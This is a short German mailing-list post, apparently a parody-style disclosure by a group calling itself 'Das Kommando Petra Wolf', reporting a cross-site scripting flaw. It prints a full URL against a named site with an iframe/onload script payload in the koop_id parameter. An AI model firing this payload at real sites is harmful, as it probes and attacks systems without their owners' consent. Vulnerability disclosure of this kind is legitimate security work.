Rotfront Genossen!

Im revolutionaeren Kampf und auf der Suche nach Alternativen zu kapitalistischer  Standardsoftware und Unternehmen hat 
"Das Kommando Petra Wolf" sogenannte angebliche Sicherheitsluecken
in Form von XSS gefunden:

http://wli-de.eurotax.com/wli/dede/entry/welcome.php?koop_id="><iframe src='' onload=alert('BorkBork')>

Wir entschuldigen uns bei der Security Szene, dass wir uns nur damit ausweisen koennen. Es wird keine weiteren XSS Advisories geben. 
Der Wolf ist schwarz.

gezeichnet

Das Kommando Petra Wolf

--
"Wir bringen Kommunismus nach Amerika"


-- 
Empfehlen Sie GMX DSL Ihren Freunden und Bekannten und wir
belohnen Sie mit bis zu 50,- Euro! https://freundschaftswerbung.gmx.de
